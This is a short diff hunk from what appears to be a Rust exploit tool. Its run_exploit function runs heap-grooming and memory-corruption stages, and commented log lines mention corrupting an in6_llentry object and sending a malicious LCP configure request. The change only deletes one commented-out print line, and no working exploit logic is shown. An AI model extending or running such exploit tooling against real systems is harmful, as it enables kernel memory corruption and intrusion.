@@ -33,7 +33,6 @@ fn run_exploit(interface_name: String) {
     expl.heap_grooming(&interface);
     println!("[*] STAGE 1: Memory corruption");
     expl.memory_corruption(&interface);
-    // println!("[+] Pinning to CPU 0...done");
     // println!("[*] Corrupt in6_llentry object...");
     // println!("[*] Sending malicious LCP configure request...");
     // println!("[*] Waiting for LCP configure reject...");
